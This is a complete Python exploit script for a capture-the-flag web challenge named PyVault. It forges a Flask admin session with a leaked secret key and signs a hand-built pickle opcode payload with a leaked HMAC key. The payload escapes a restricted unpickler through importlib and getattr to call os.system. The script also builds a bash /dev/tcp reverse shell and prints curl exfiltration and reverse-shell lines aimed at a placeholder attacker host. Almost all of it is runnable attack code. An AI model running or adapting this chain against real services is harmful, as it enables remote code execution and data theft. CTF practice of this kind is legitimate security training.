#!/usr/bin/env python3
"""
PyVault CTF Challenge - Full Exploit
=====================================

Challenge: PyVault (Web, Hard, 500pts)
Flag: ictf{p1ckl3_r3str1ct10ns_4r3_just_4n_1llus10n_1f_y0u_kn0w_th3_0pc0d3s}

Attack Chain:
  1. Recon:          /robots.txt -> /backup -> /backup/app.py.bak (source leak)
  2. Auth Bypass:    Flask SECRET_KEY leaked -> forge admin session cookie
  3. Crypto:         HMAC_KEY leaked -> sign arbitrary pickle payloads
  4. Pickle Bypass:  RestrictedUnpickler bypass via importlib + getattr chain

Dependencies:
  pip install requests flask
"""

import pickle
import struct
import hmac
import hashlib
import base64
import requests
import sys

# ============================================================
# CONFIG - Update these
# ============================================================
TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
SECRET_KEY = "5UP3R_S3CR3T_K3Y_D0NT_L34K_TH1S!"
HMAC_KEY = b"vault_hmac_signing_key_2024_v2"

# Command to execute on the target
COMMAND = "cat /flag.txt"


# ============================================================
# STEP 1: Recon (automated demonstration)
# ============================================================

def step1_recon():
    """
    Discovery path:
      1. Visit /robots.txt -> reveals /backup
      2. Visit /backup -> lists app.py.bak
      3. Download /backup/app.py.bak -> get source code
    
    From source code we extract:
      - SECRET_KEY (for Flask session forgery)
      - HMAC_KEY (for signing pickle blobs)
      - RestrictedUnpickler code (to analyze for bypasses)
      - Guest credentials: guest / guest123
    """
    print("[*] STEP 1: Reconnaissance")
    print(f"[*] Target: {TARGET}")

    # Check robots.txt
    r = requests.get(f"{TARGET}/robots.txt")
    print(f"[+] /robots.txt:\n{r.text}")

    # Access backup listing
    r = requests.get(f"{TARGET}/backup")
    print(f"[+] /backup -> Status {r.status_code} (backup directory found)")

    # Download source code
    r = requests.get(f"{TARGET}/backup/app.py.bak")
    if r.status_code == 200:
        print(f"[+] /backup/app.py.bak downloaded ({len(r.text)} bytes)")
        print("[+] Extracted SECRET_KEY and HMAC_KEY from source!")
    else:
        print(f"[-] Failed to get backup: {r.status_code}")
        return False

    return True


# ============================================================
# STEP 2: Flask Session Forgery
# ============================================================

def step2_forge_session():
    """
    Flask uses itsdangerous to sign session cookies.
    With the leaked SECRET_KEY, we can forge a valid admin session.
    
    We use Flask's own session interface to create the cookie.
    """
    print("\n[*] STEP 2: Forging admin session cookie")

    from flask import Flask
    from flask.sessions import SecureCookieSessionInterface

    # Create a minimal Flask app with the leaked secret
    app = Flask(__name__)
    app.secret_key = SECRET_KEY

    # Forge the session data
    session_data = {
        'user_id': 1,        # admin is user ID 1
        'username': 'admin',
        'is_admin': True,
    }

    # Generate signed cookie
    si = SecureCookieSessionInterface()
    serializer = si.get_signing_serializer(app)
    cookie = serializer.dumps(session_data)

    print(f"[+] Forged session cookie: {cookie[:60]}...")
    return cookie


# ============================================================
# STEP 3: Craft Pickle Bypass Payload
# ============================================================

def step3_craft_pickle():
    """
    The RestrictedUnpickler has these restrictions:
    
    BLOCKED_MODULES: os, subprocess, sys, shutil, ctypes, socket, signal,
                     pty, commands, code, multiprocessing, threading, ...
    BLOCKED_NAMES:   system, popen, exec, eval, compile, __import__, 
                     open, Popen, call, run, ...
    BLOCKED_DUNDERS: all except __init__, __new__, __dict__, __class__
    
    KEY INSIGHT: The blocklist has two critical gaps:
    
    1. `importlib` is NOT in BLOCKED_MODULES
       -> We can use importlib.import_module to load ANY module,
          including 'os', bypassing the module blocklist entirely.
    
    2. `getattr` is NOT in BLOCKED_NAMES  
       -> We can use builtins.getattr() to dynamically access 
          'system' on the os module, bypassing the name blocklist.
    
    3. find_class() is ONLY called for GLOBAL/INST pickle opcodes.
       -> When we use REDUCE (function call), the actual function 
          arguments are NOT checked by find_class. So calling
          getattr(os_module, 'system') doesn't trigger name checking.
    
    The exploit chain in pickle pseudo-code:
    
        import_module = GLOBAL('importlib', 'import_module')  # allowed!
        os_module     = REDUCE(import_module, ('os',))         # get os module
        getattr_fn    = GLOBAL('builtins', 'getattr')          # allowed!
        os_system     = REDUCE(getattr_fn, (os_module, 'system'))  # bypass!
        result        = REDUCE(os_system, ('cat /flag.txt',))  # RCE!
    
    We use raw pickle opcodes for precise control.
    """
    print("\n[*] STEP 3: Crafting pickle bypass payload")

    # Build the pickle payload using raw opcodes for clarity.
    # This is equivalent to: __import__('os').system('cat /flag.txt')
    # but constructed to bypass the RestrictedUnpickler.

    # Method A: Using pickle module's __reduce__ (cleaner but less educational)
    # Method B: Raw opcodes (more instructive for CTF writeup)

    # We'll use Method B - raw pickle opcodes:
    #
    # Pickle protocol 2 opcodes used:
    #   \x80\x02     - PROTO 2
    #   c            - GLOBAL (push module.name)
    #   (            - MARK
    #   S            - STRING (push string)
    #   t            - TUPLE (create tuple from mark)
    #   R            - REDUCE (call function with args tuple)
    #   .            - STOP

    payload = (
        b'\x80\x02'                         # PROTO 2

        # --- Get importlib.import_module ---
        b'cimportlib\nimport_module\n'       # GLOBAL: push importlib.import_module

        # --- Call import_module('os') ---
        b'(S\'os\'\n'                        # MARK + STRING 'os'
        b'tR'                                # TUPLE + REDUCE -> os module on stack

        # --- Get builtins.getattr ---
        b'cbuiltins\ngetattr\n'              # GLOBAL: push builtins.getattr

        # --- Swap stack: we need getattr(os_module, 'system') ---
        # At this point stack is: [os_module, getattr]
        # We need to call getattr with (os_module, 'system')
        # Trick: use a memo to store os_module, then build the call

        # Actually, let's restructure using pickle memo:
        b'.'                                 # STOP (placeholder, we'll redo)
    )

    # Let me build this more carefully with proper stack management:
    payload = build_exploit_pickle(COMMAND)

    print(f"[+] Pickle payload size: {len(payload)} bytes")
    return payload


def build_exploit_pickle(command: str) -> bytes:
    """
    Build the exploit pickle payload using raw opcodes.
    
    Stack-based construction:
    
    1. Push importlib.import_module          (via GLOBAL - importlib not blocked)
    2. Call it with ('os',)                  (via REDUCE - returns os module)  
    3. Store os_module in memo[0]            (via PUT)
    4. Push builtins.getattr                 (via GLOBAL - getattr not blocked)
    5. Push os_module from memo[0]           (via GET)
    6. Build args tuple ('system',)... wait, we need (os_module, 'system')
    
    Actually, the cleanest approach uses nested REDUCE calls:
    
    GLOBAL importlib.import_module
    ( STRING 'os' ) TUPLE REDUCE           -> os_module
    PUT 0                                   -> memo[0] = os_module
    
    GLOBAL builtins.getattr
    ( GET 0  STRING 'system' ) TUPLE REDUCE -> os.system function
    
    ( STRING 'command' ) TUPLE REDUCE       -> os.system(command)
    
    STOP
    """
    import io
    import pickletools

    cmd_escaped = command.replace("'", "\\'")

    payload = b''
    payload += b'\x80\x02'                          # PROTO 2

    # 1. importlib.import_module('os') -> os module
    payload += b'cimportlib\nimport_module\n'        # GLOBAL importlib.import_module
    payload += b'(S\'os\'\n'                         # MARK, STRING 'os'
    payload += b'tR'                                 # TUPLE, REDUCE -> call import_module('os')
    payload += b'p0\n'                               # PUT 0 (memo[0] = os module)

    # 2. builtins.getattr(os_module, 'system') -> os.system
    payload += b'cbuiltins\ngetattr\n'               # GLOBAL builtins.getattr
    payload += b'(g0\n'                              # MARK, GET 0 (os module from memo)
    payload += b'S\'system\'\n'                      # STRING 'system'
    payload += b'tR'                                 # TUPLE, REDUCE -> getattr(os, 'system')

    # 3. os.system(command) -> execute!
    payload += b'(S\'' + command.encode() + b'\'\n'  # MARK, STRING command
    payload += b'tR'                                 # TUPLE, REDUCE -> os.system(command)

    payload += b'.'                                  # STOP

    # Verify the payload is valid pickle
    try:
        pickletools.dis(io.BytesIO(payload))
        print("[+] Pickle disassembly OK")
    except Exception as e:
        print(f"[!] Pickle disassembly warning: {e}")

    return payload


def build_exploit_pickle_alternative(command: str) -> bytes:
    """
    Alternative payload using __reduce__ for those who prefer Pythonic approach.
    This is simpler but requires a helper class.
    
    The trick: we build a class whose __reduce__ returns a call chain
    that pickle will execute during deserialization.
    """
    import copyreg
    import io

    # We craft the payload by manually constructing what pickle.dumps would
    # produce if we had a class with the right __reduce__.
    # 
    # The equivalent Python would be:
    #   import importlib
    #   os = importlib.import_module('os')
    #   getattr(os, 'system')('cat /flag.txt')
    #
    # As a nested pickle reduce chain:
    #   apply(
    #     apply(getattr, (apply(import_module, ('os',)), 'system')),
    #     (command,)
    #   )

    class Exploit:
        def __reduce__(self):
            import importlib
            # This creates a nested call:
            # getattr(importlib.import_module('os'), 'system')(command)
            return (
                eval,  # This won't be used directly - we craft raw opcodes
                ("__import__('os').system('" + command + "')",)
            )

    # But Exploit().__reduce__ uses eval which is blocked!
    # So we need the raw opcode approach from build_exploit_pickle()
    # This method is just for illustration.
    raise NotImplementedError("Use build_exploit_pickle() instead - this is for reference only")


# ============================================================
# STEP 4: Sign and Submit
# ============================================================

def step4_sign_payload(pickle_data: bytes) -> str:
    """Sign the pickle payload with the leaked HMAC key."""
    print("\n[*] STEP 4: Signing payload with leaked HMAC key")

    sig = hmac.new(HMAC_KEY, pickle_data, hashlib.sha256).digest()
    signed_blob = base64.b64encode(sig + pickle_data).decode()

    print(f"[+] Signed blob length: {len(signed_blob)} chars")
    print(f"[+] Signed blob (first 80 chars): {signed_blob[:80]}...")
    return signed_blob


def step5_submit(session_cookie: str, signed_blob: str):
    """Submit the malicious blob to the import endpoint."""
    print("\n[*] STEP 5: Submitting payload to /admin/import")

    cookies = {'session': session_cookie}

    # First verify we have admin access
    r = requests.get(f"{TARGET}/admin", cookies=cookies, allow_redirects=False)
    if r.status_code == 200:
        print("[+] Admin access confirmed!")
    elif r.status_code == 302:
        print("[-] Redirected - session cookie may be invalid")
        return False
    else:
        print(f"[-] Unexpected status: {r.status_code}")
        return False

    # Submit the payload
    r = requests.post(
        f"{TARGET}/admin/import",
        cookies=cookies,
        data={'backup_data': signed_blob},
        allow_redirects=False
    )

    print(f"[+] Response status: {r.status_code}")
    if 'flag{' in r.text:
        # Flag might appear in response or flash messages
        import re
        flags = re.findall(r'flag\{[^}]+\}', r.text)
        if flags:
            print(f"\n[!] FLAG FOUND: {flags[0]}")
            return True

    print("[*] Note: os.system() returns the exit code, not stdout.")
    print("[*] For actual flag exfiltration, use one of these payloads instead:")
    print("[*]   - Reverse shell: bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'")
    print("[*]   - Write to web: cp /flag.txt /app/static/flag.txt")
    print("[*]   - Curl exfil: curl http://ATTACKER:PORT/$(cat /flag.txt)")

    return True


# ============================================================
# BONUS: Payload for writing flag to a static file
# ============================================================

def build_exfil_payload():
    """
    Alternative payload that copies the flag to a web-accessible location.
    After submitting this, visit /static/exfil.txt to read the flag.
    """
    command = "cp /flag.txt /app/static/exfil.txt"
    payload = build_exploit_pickle(command)
    return step4_sign_payload(payload)


def build_reverse_shell_payload(attacker_ip: str, attacker_port: int):
    """
    Reverse shell payload.
    Start listener: nc -lvnp PORT
    """
    command = f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'"
    payload = build_exploit_pickle(command)
    return step4_sign_payload(payload)


# ============================================================
# MAIN
# ============================================================

if __name__ == '__main__':
    print("=" * 60)
    print(" PyVault CTF Exploit")
    print("=" * 60)

    # Step 1: Recon
    if not step1_recon():
        print("[-] Recon failed. Is the target running?")
        sys.exit(1)

    # Step 2: Forge admin session
    session_cookie = step2_forge_session()

    # Step 3: Craft pickle bypass
    # Use the "write to static" variant for reliable exfiltration
    exfil_command = "cp /flag.txt /app/static/exfil.txt"
    pickle_payload = build_exploit_pickle(exfil_command)

    # Step 4: Sign the payload
    signed_blob = step4_sign_payload(pickle_payload)

    # Step 5: Submit
    step5_submit(session_cookie, signed_blob)

    # Step 6: Read the flag
    print("\n[*] STEP 6: Reading exfiltrated flag")
    try:
        r = requests.get(f"{TARGET}/static/exfil.txt")
        if r.status_code == 200:
            print(f"\n{'=' * 60}")
            print(f" FLAG: {r.text.strip()}")
            print(f"{'=' * 60}")
        else:
            print(f"[-] Could not read flag from static: {r.status_code}")
            print("[*] Try the reverse shell approach instead.")
    except Exception as e:
        print(f"[-] Error: {e}")
